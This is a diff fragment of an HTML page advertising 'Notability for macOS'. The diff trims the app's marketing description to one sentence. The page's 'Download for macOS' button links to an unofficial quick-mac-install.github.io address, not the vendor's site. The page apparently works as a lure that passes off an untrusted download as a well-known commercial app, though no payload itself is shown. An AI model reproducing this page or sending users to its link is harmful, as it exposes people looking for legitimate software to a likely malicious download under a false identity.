@@ -4,11 +4,7 @@
 
 <div>
 <h3>Notability for macOS</h3>
-<p><a href="#">Notability for macOS</a> is an all-in-one note-taking app that allows you to capture and organize your thoughts, lectures, and ideas in an intuitive, easy-to-use environment. Whether you're taking handwritten notes with the Apple Pencil or typing on the keyboard, Notability provides all the tools you need to get your thoughts on paper. It's perfect for students, professionals, or anyone who needs a versatile and effective note-taking app.
-
-One of the standout features of Notability is its ability to combine handwritten notes with text, photos, web clips, and audio recordings. You can record lectures or meetings and annotate them in real time, adding text or drawings as the conversation progresses. The app's powerful search function allows you to easily find your notes later, even if they contain handwritten content or audio recordings. With iCloud integration, your notes are seamlessly synced across all your Apple devices.
-
-With its rich feature set, Notability goes beyond simple note-taking. It allows you to organize your notes into subjects and dividers, export them as PDFs, and share them easily. Whether you’re at school, work, or home, Notability helps you stay organized and efficient by giving you a place to capture all of your important information.</p>
+<p><a href="#">Notability for macOS</a> is an all-in-one note-taking app that allows you to capture and organize your thoughts, lectures, and ideas in an intuitive, easy-to-use environment.</p>
 
 <a href="https://quick-mac-install.github.io/.github/Notability">
   <img src="https://i.postimg.cc/4NYk88tL/219133640-8b7a0179-20a7-4e02-8887-fbbd2eaad64b.png" width="200" alt="Download for macOS"/>
